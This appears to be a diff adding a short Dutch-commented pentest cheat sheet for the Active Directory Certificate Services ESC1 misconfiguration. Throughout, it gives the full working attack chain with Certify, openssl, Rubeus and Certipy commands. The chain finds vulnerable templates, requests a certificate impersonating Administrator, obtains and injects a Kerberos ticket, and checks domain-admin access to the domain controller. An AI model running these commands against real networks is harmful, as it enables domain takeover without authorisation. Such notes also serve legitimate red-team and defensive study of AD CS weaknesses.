@@ -1,0 +1,18 @@
+# AD CS ESC1 - ENROLLEE_SUPPLIES_SUBJECT misconfig
+# Template staat toe dat aanvrager zelf de Subject Alternative Name (SAN) bepaalt
+# Hiermee kun je een certificaat aanvragen namens elke user (bijv. Administrator)
+# Stap 1: Vind kwetsbare templates
+.\Certify.exe find /vulnerable
+# Zoek naar: msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
+# Stap 2: Certificaat aanvragen als Administrator
+.\Certify.exe request /ca:dc01.domain.local\domain-CA /template:"TemplateName" /altname:Administrator
+# Stap 3: Convert cert.pem naar .pfx
+# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
+# Stap 4: TGT aanvragen met certificaat via Rubeus
+.\Rubeus.exe asktgt /user:Administrator /certificate:esc1.pfx /password:CertPassword /ptt
+# Stap 5: Verifieer DA toegang
+ls \\dc01.domain.local\c$
+# Via Certipy (Linux):
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template TemplateName -upn Administrator@domain.local
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+# Tip: Check enrollment rechten - template moet enrollable zijn voor jouw user/groep
